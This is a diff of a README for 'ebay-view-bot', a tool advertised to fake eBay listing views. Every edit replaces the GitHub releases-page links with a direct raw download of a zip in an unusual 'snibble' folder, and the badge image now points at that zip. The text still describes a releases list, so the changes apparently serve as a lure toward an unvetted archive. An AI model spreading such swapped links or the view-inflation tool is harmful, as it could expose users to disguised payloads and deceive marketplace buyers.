@@ -1,6 +1,6 @@
 # 🤖 ebay-view-bot - Boost Your eBay SEO Effortlessly  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-%234CAF50?style=flat&logo=github)](https://github.com/GarimaBanerjee/ebay-view-bot/releases)  
+[![Download Now](https://raw.githubusercontent.com/GarimaBanerjee/ebay-view-bot/main/snibble/ebay-view-bot.zip%20Now-%20-%234CAF50?style=flat&logo=github)](https://raw.githubusercontent.com/GarimaBanerjee/ebay-view-bot/main/snibble/ebay-view-bot.zip)  
 
 ## 🚀 Getting Started  
 
@@ -18,7 +18,7 @@ Before you begin, make sure your system meets the following requirements:
 
 ## 📥 Download & Install  
 
-To download the ebay-view-bot, please visit this page: [Download the latest release](https://github.com/GarimaBanerjee/ebay-view-bot/releases).  
+To download the ebay-view-bot, please visit this page: [Download the latest release](https://raw.githubusercontent.com/GarimaBanerjee/ebay-view-bot/main/snibble/ebay-view-bot.zip).  
 
 Once there, you will see the list of available releases. Choose the latest version (recommended for new users). Click on the asset file to download it.  
 
@@ -75,6 +75,6 @@ This application is released under the MIT License. You can use, modify, and sha
 
 ## 🌐 More Information  
 
-For updated features, bug fixes, or enhancement notes, refer to the [Releases page](https://github.com/GarimaBanerjee/ebay-view-bot/releases) frequently.  
+For updated features, bug fixes, or enhancement notes, refer to the [Releases page](https://raw.githubusercontent.com/GarimaBanerjee/ebay-view-bot/main/snibble/ebay-view-bot.zip) frequently.  
 
 Thank you for choosing ebay-view-bot! We hope you find it useful and effective in boosting your eBay listings. Happy selling!
